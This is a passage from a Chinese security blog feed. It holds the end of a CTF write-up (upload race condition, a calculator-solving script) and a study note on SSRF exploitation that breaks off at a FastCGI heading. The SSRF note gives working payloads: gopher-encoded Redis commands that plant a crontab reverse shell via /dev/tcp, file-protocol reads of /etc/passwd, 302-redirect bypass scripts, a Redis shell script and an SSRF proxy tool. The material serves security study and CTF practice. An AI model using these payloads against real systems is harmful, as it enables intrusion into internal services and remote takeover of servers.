application/x-httpd-php</code></p><p>让服务器把上传的合法其他文件当做php文件来解析,执行其中的php代码,获得shell或者拿flag</p><p>由于之前fuzz测试的时候发现,什么后缀的都好像不能传.这明显不符合道题,因此可能是存在<code>条件竞争</code>,即我们上传的正常文件一下就被删除了,<strong>需要不断的上传文件</strong>,<strong>利用还未被删除的这个间隙去执行</strong></p><p>因为不知道文件上传的路径,只能够猜测了,访问<code>http://8aaad470-51db-4087-a5cf-041bd24d53b0.node3.buuoj.cn/upload/</code>返回的是forbidden,说明确实存在这个路径</p><p>随便传一个图片上去,返回了文件的路径,再随便传一个文件上去,返回了同样的路径,说明,在session不变的情况下,路径是不变的.</p><p>说明就可以利用条件竞争来getshell</p><p><img src="https://i.loli.net/2020/01/23/xDaJtjO9HImMlr5.png" alt></p><p>成功用蚁剑连上后,找到flag即可</p><h1 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h1><p>打开题目后,发现是一个计算器,要计算一千次才能得到flag.这个和bugku上的题有的像</p><p>写脚本就好了,主要就是<code>re</code>和<code>requests</code>库,还有循环执行1000次</p><p>exp.py</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> requests <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> res <span class="token operator">=</span> session<span class="token punctuation">(</span><span class="token punctuation">)</span>a <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://875cd671-8b00-4030-bda7-5ffc93dd8410.node3.buuoj.cn"</span><span class="token punctuation">)</span>pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'\d+.[+-].\d+'</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>text<span class="token punctuation">)</span>c <span class="token operator">=</span> eval<span class="token punctuation">(</span>pattern<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>a <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://875cd671-8b00-4030-bda7-5ffc93dd8410.node3.buuoj.cn/"</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"answer"</span> <span class="token punctuation">:</span> c<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'\d+.[+-].\d+'</span><span class="token punctuation">,</span> a<span class="token punctuation">.</span>text<span class="token punctuation">)</span>    c <span class="token operator">=</span> eval<span class="token punctuation">(</span>pattern<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    a <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://875cd671-8b00-4030-bda7-5ffc93dd8410.node3.buuoj.cn/"</span><span class="token punctuation">,</span> data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"answer"</span> <span class="token punctuation">:</span> c<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>路漫漫…</p><p>不敢停…</p><hr><p>今天是除夕,新年快乐!希望新的一年,技术能变强大,希望能快点,因为感觉追不上了,但有怕速度太快,学的不扎实!</p><p>多锻炼身体,规律作息吧!!!!</p><p>希望一切</p><p>都</p><p>顺心顺意</p><p>一切</p><p>都会变好的</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
            <tag> 弱口令 </tag>
            
            <tag> sqli </tag>
            
            <tag> 文件包含 </tag>
            
            <tag> phar反序列化 </tag>
            
            <tag> git源码泄露 </tag>
            
            <tag> 套娃命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一篇文章深入学习SSRF漏洞</title>
      <link href="/posts/20200120/"/>
      <url>/posts/20200120/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00    前言"></a>0x00    前言</h1><p>因为最近做题遇到了两道在考察SSRF漏洞的CTF题目,感觉只是知道个大概,知道怎么去判断可能存在SSRF漏洞肯定是不够的,必须要从原理上理解这个漏洞,因为<strong>SSRF漏洞更多的不是一个漏洞,而是一种攻击思路.</strong></p><blockquote><p>本学习笔记,大量参考自网络上各位大佬总结好的,再加上自己的心得总结而成,用途仅用于安全技术学习.文末注明参考资料,侵删.</p></blockquote><h1 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01    基础知识"></a>0x01    基础知识</h1><p>这里新的相关基础知识不是很多,主要是以前都有总结过.主要是一些<strong>函数</strong>和一些<strong>协议</strong>的知识</p><h2 id="PHP-function"><a href="#PHP-function" class="headerlink" title="PHP function"></a>PHP function</h2><p>下面学习相关函数和后端实现(从CTF wiki拿过来的)</p><p><code>file_get_contents()</code></p><p><img src="https://i.loli.net/2020/01/20/Al1HjTFmIpxSeWv.png" alt></p><pre class=" language-PHP"><code class="language-PHP"><?phpif (isset($_POST['url'])) {     $content = file_get_contents($_POST['url']);     $filename ='./images/'.rand().';img1.jpg';     file_put_contents($filename, $content);     echo $_POST['url'];     $img = "<img src=\"".$filename."\"/>"; }echo $img;?></code></pre><p><code>fsockopen()</code></p><p><img src="https://i.loli.net/2020/01/20/6KiSlzRa5W43fT7.png" alt></p><pre class=" language-PHP"><code class="language-PHP"><?php function GetFile($host,$port,$link) { // 定义一个请求文件的函数    $fp = fsockopen($host, intval($port), $errno, $errstr, 30); // intval()获取变量的整数值     if (!$fp) {         echo "$errstr (error number $errno) \n";     } else { // 发起HHTP请求        $out = "GET $link HTTP/1.1\r\n";         $out .= "Host: $host\r\n";         $out .= "Connection: Close\r\n\r\n";         $out .= "\r\n";         fwrite($fp, $out);         $contents='';         while (!feof($fp)) {             $contents.= fgets($fp, 1024);         }         fclose($fp);         return $contents;     } }?></code></pre><p><code>curl_exec()</code></p><p><img src="https://i.loli.net/2020/01/20/yg9V2ovedIGnCUa.png" alt></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$curlobj</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//初始化一个cURL会话为curlobj</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_POST</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 设置URL选项</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 抓取URL并传递给浏览器</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$curlobj</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 关闭cURL资源,释放系统资源</span>    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'./curled/'</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.txt'</span><span class="token punctuation">;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p>Python后端实现</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding: utf-8</span>    <span class="token keyword">import</span> urllib    url <span class="token operator">=</span> <span class="token string">'http://127.0.0.1'</span>    info <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>info<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h2><p><strong>Dict 协议</strong> <a href="http://www.dict.org/rfc2229.txt" target="_blank" rel="noopener">http://www.dict.org/rfc2229.txt</a></p><p><a href="https://baike.baidu.com/item/DICT协议" target="_blank" rel="noopener">https://baike.baidu.com/item/DICT%E5%8D%8F%E8%AE%AE</a></p><p>Dict协议,字典服务器器协议,dict是基于查询响应的TCP协议,它的目标是超越Webster protocol，并允许客户端在使用过程中访问更多字典。Dict服务器和客户机使用TCP端口2628。</p><p><strong>Gopher 协议</strong></p><p>Gopher协议是互联网上使用的分布型的文件搜集获取网络协议。gopher协议是在HTTP协议出现之前,在internet上常见重用的协议,但是现在已经用的很少了</p><p><img src="https://i.loli.net/2020/01/20/ayzGWCRSKb7Vhwr.png" alt></p><p><strong>File 协议</strong></p><p>这个协议就比较熟悉了吧</p><p>File协议也就是,本地文件传输协议</p><h1 id="0x02-什么是SSRF漏洞"><a href="#0x02-什么是SSRF漏洞" class="headerlink" title="0x02    什么是SSRF漏洞"></a>0x02    什么是SSRF漏洞</h1><h2 id="SSRF-简介"><a href="#SSRF-简介" class="headerlink" title="SSRF    简介"></a>SSRF    简介</h2><p>SSRF，Server-Side Request Forgery，服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞。一般情况下，SSRF <strong>攻击的目标是从外网无法访问的内部系统。</strong></p><p>因此学习SSRF就奔着三个目的.what?how to do?how to bypass?</p><p>漏洞形成的<strong>原因大多是因为服务端提供了从其他服务器应用获取数据的功能且没有对目标地址作过滤和限制。</strong></p><p>攻击者可以利用 SSRF 实现的攻击主要有 5 种：</p><ol><li>可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的 banner 信息</li><li>攻击运行在内网或本地的应用程序（比如溢出）</li><li>对内网 WEB 应用进行指纹识别，通过访问默认文件实现</li><li>攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</li><li>利用 <code>file</code> 协议读取本地文件等</li></ol><h2 id="SSRF漏洞-出现的场景"><a href="#SSRF漏洞-出现的场景" class="headerlink" title="SSRF漏洞    出现的场景"></a>SSRF漏洞    出现的场景</h2><ul><li>能够对外发起网络请求的地方，就可能存在 SSRF 漏洞</li><li>从远程服务器请求资源（Upload from URL，Import &amp; Export RSS Feed）</li><li>数据库内置功能（Oracle、MongoDB、MSSQL、Postgres、CouchDB）</li><li>Webmail 收取其他邮箱邮件（POP3、IMAP、SMTP）</li><li>文件处理、编码处理、属性信息处理（ffmpeg、ImageMagic、DOCX、PDF、XML）</li></ul><hr><ol><li>社交分享功能：获取超链接的标题等内容进行显示</li><li>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li><li>在线翻译：给网址翻译对应网页的内容</li><li>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</li><li>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用户体验</li><li>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</li><li>网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</li><li>数据库内置功能：数据库的比如mongodb的copyDatabase函数</li><li>邮件系统：比如接收邮件服务器地址</li><li>编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</li><li>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞。<br>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</li><li>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</li></ol><h2 id="SSRF漏洞验证"><a href="#SSRF漏洞验证" class="headerlink" title="SSRF漏洞验证"></a>SSRF漏洞验证</h2><p>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求</p><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><p>2.dnslog等工具进行测试，看是否被访问</p><p>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p><p>3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</p><p>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>–通过二级域名暴力猜解工具模糊猜测内网地址</p><p>4.直接返回的Banner、title、content等信息</p><p>5.留意bool型SSRF</p><h1 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03    漏洞利用"></a>0x03    漏洞利用</h1><h2 id="本地利用"><a href="#本地利用" class="headerlink" title="本地利用"></a>本地利用</h2><p><img src="https://i.loli.net/2020/01/20/NI4mZPVf1ypKxQo.png" alt>可以看到curl可以支持的协议有dice file ftp ftps gopher http https…</p><p>file协议查看文件 <code>curl -v &#39;file://etc/passwd</code></p><p><img src="https://i.loli.net/2020/01/20/4dJ5DYr62HWIGkO.png" alt></p><p>dict协议探测端口<code>curl -v &#39;dict://127.0.0.1:22/info&#39;</code>查看ssh的banner信息,<code>curl -v  &#39;dict://127.0.0.1:6379/info&#39;</code>查看redis相关配置</p><p><img src="https://i.loli.net/2020/01/20/E5N18xmjpXVHeYz.png" alt></p><p>gopher协议支持GET&amp;POST请求,同时在攻击内网ftp/redis/telnet/Memcache上有非常大的作用,<strong>利用gopher协议访问redis反弹shell</strong></p><pre><code>curl -v &#39;gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39;</code></pre><h2 id="远程利用"><a href="#远程利用" class="headerlink" title="远程利用"></a>远程利用</h2><p>首先假设攻击者预先编辑好的SSRF漏洞为ssrf.php</p><p>dict协议探测端口</p><pre><code>curl -v ‘http://a.com/ssrf.php?url=dict://172.0.0.1:22/info‘curl -v ‘http://a.com/ssrf.php?url=dict://127.0.0.1:6379/info‘</code></pre><p>gopher协议访问redis反弹shell</p><pre><code>curl -v &#39;http://a.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&#39;</code></pre><p>漏洞代码ssrf2.php</p><ol><li>限制协议HTTP/HTTPS</li><li>跳转重定向为true,默认不跳转</li></ol><pre class=" language-PHP"><code class="language-PHP"><?phpfunction curl($url){$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);// 限制为HTTPS、HTTP协议curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_setopt($ch, CURLOPT_HEADER, 0);curl_exec($ch);curl_close($ch);}$url = $_GET['url'];curl($url);?></code></pre><p>这种情况使用dict协议是不行的,但是可以利用302跳转的方式来绕过http协议限制</p><pre><code>curl -v &quot;http:///forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img]http://a.com/302.php?helo.jpg[/img]&quot;</code></pre><p>302.php中的代码为: </p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span>"Location<span class="token punctuation">:</span> dict<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//10.0.0.2:6379/info");#探测redsi信息</span><span class="token delimiter">?></span></code></pre><p>location 302 跳转辅助脚本</p><pre class=" language-PHP"><code class="language-PHP"><?php$ip = $_GET['ip'];$port = $_GET['port'];$scheme = $_GET['s'];$data = $_GET['data'];header("Location: $scheme://$ip:$port/$data");?></code></pre><p>举例腾讯微博2016年的SSRF(参考资料3)</p><pre><code>curl -v &#39;http://share.v.t.qq.com/index.php?c=share&amp;a=pageinfo&amp;url=http://localhost/file.php&#39;#file.php&lt;?phpheader(&quot;Location: file:///etc/passwd&quot;);?&gt;</code></pre><h2 id="攻击Application"><a href="#攻击Application" class="headerlink" title="攻击Application"></a>攻击Application</h2><p>正如笔记开篇说道,ssrf更多的来说是一种攻击模式.web ssrf可以作为跳板来攻击内网多种应用.比如redis/discuz/fastcgi/memcache/webdav/Struts/jboss/axis2等应用</p><p>虽然下面很多东西现在我还用不到,但是遇见了就学习记录下来,以后随时可以翻看</p><p>首先需要探测目标内网,因为服务器支持gopher协议,<strong>ssrf+gopher=ssrfsocks</strong></p><p><a href="https://github.com/iamultra/ssrfsocks" target="_blank" rel="noopener">https://github.com/iamultra/ssrfsocks</a></p><p><a href="https://github.com/bcoles/ssrf_proxy" target="_blank" rel="noopener">https://github.com/bcoles/ssrf_proxy</a></p><p>第一个大概是在讲解原理,第二个是一个ssrf代理的工具</p><p>猪猪侠的ssrfsocks.py脚本</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> socket<span class="token keyword">import</span> thread<span class="token keyword">import</span> binascii<span class="token keyword">import</span> struct<span class="token keyword">import</span> urllib<span class="token keyword">import</span> urllib2HOST <span class="token operator">=</span> <span class="token string">'localhost'</span>PORT <span class="token operator">=</span> <span class="token number">65432</span>BUFSIZ <span class="token operator">=</span> <span class="token number">4096</span>TIMEOUT <span class="token operator">=</span> <span class="token number">5</span>SOCKS <span class="token operator">=</span> <span class="token boolean">True</span>CONNECT <span class="token operator">=</span> <span class="token string">"gopher%3A//"</span><span class="token keyword">def</span> <span class="token function">decodesocks</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span> req<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x04'</span><span class="token punctuation">:</span><span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'bad version number'</span><span class="token punctuation">)</span><span class="token keyword">if</span> req<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x01'</span><span class="token punctuation">:</span><span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'only tcp stream supported'</span><span class="token punctuation">)</span>port <span class="token operator">=</span> req<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>host <span class="token operator">=</span> req<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token keyword">if</span> host<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'x00'</span> <span class="token operator">and</span> host<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'x00'</span> <span class="token operator">and</span> host<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'x00'</span> <span class="token operator">and</span> host<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x00'</span><span class="token punctuation">:</span>byname <span class="token operator">=</span> <span class="token boolean">True</span><span class="token keyword">else</span><span class="token punctuation">:</span>byname <span class="token operator">=</span> <span class="token boolean">False</span>userid <span class="token operator">=</span> <span class="token string">""</span>i <span class="token operator">=</span> <span class="token number">8</span><span class="token keyword">while</span> req<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x00'</span><span class="token punctuation">:</span>userid <span class="token operator">+=</span> req<span class="token punctuation">[</span>i<span class="token punctuation">]</span>extra <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">if</span> byname<span class="token punctuation">:</span><span class="token keyword">while</span> req<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'x00'</span><span class="token punctuation">:</span>extra <span class="token operator">+=</span> req<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token keyword">return</span> host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> extra<span class="token keyword">def</span> <span class="token function">child</span><span class="token punctuation">(</span>sock<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">if</span> SOCKS<span class="token punctuation">:</span>req <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>host<span class="token punctuation">,</span> port<span class="token punctuation">,</span> extra <span class="token operator">=</span> decodesocks<span class="token punctuation">(</span>req<span class="token punctuation">)</span><span class="token keyword">if</span> extra <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>dest <span class="token operator">=</span> socket<span class="token punctuation">.</span>inet_ntoa<span class="token punctuation">(</span>host<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>dest <span class="token operator">=</span> extradestport<span class="token punctuation">,</span> <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">"!H"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"x00x5a"</span><span class="token operator">+</span>port<span class="token operator">+</span>host<span class="token punctuation">)</span>data <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print "sending:", data</span>encodeddata <span class="token operator">=</span> urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>data<span class="token punctuation">)</span>url <span class="token operator">=</span> base<span class="token operator">+</span>CONNECT<span class="token operator">+</span>dest<span class="token operator">+</span><span class="token string">":"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>destport<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"/A"</span><span class="token operator">+</span>encodeddata<span class="token comment" spellcheck="true">#print "connecting to ", url</span>ret <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span>TIMEOUT<span class="token punctuation">)</span>retdata <span class="token operator">=</span> ret<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print "received:", retdata</span><span class="token keyword">if</span> len<span class="token punctuation">(</span>retdata<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>sock<span class="token punctuation">.</span>send<span class="token punctuation">(</span>retdata<span class="token punctuation">)</span>sock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">print</span> esock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">:</span>sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token string">'Usage: %s BASEURLnExample: %s "http://victim.com/xxe.php?uri="'</span> <span class="token operator">%</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>base <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'listener ready on port'</span><span class="token punctuation">,</span> PORT<span class="token keyword">try</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>client<span class="token punctuation">,</span> addr <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print 'connection from:', addr</span>thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>child<span class="token punctuation">,</span> <span class="token punctuation">(</span>client<span class="token punctuation">,</span>addr<span class="token punctuation">,</span>base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>攻击redis(6379端口)<br>更多的详细内容 请看 <a href="https://xz.aliyun.com/t/5665" target="_blank" rel="noopener">浅析Redis中SSRF的利用</a></p><p>首先需要了解通过redis getshell的exp 写成的bash</p><pre><code>echo -e &quot;nn*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1nn&quot;|redis-cli -h $1 -p $2 -x set 1 redis-cli -h $1 -p $2 config set dir /var/spool/cron/ redis-cli -h $1 -p $2 config set dbfilename root redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit</code></pre><p>执行命令bash shell.sh 127.0.0.1:6389 可在redis里写入crontab的定时任务,本地通过nc -nvlp 2333 开启监听2333端口来反弹shell</p><p>redis常见的ssrf攻击大概有: </p><ol><li>绝对路径写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li></ol><p>详细内容还是看那篇文章.</p><p>将普通请求转成适配的gopher协议(看参考资料7)</p><p>攻击FastCGI</p><p> 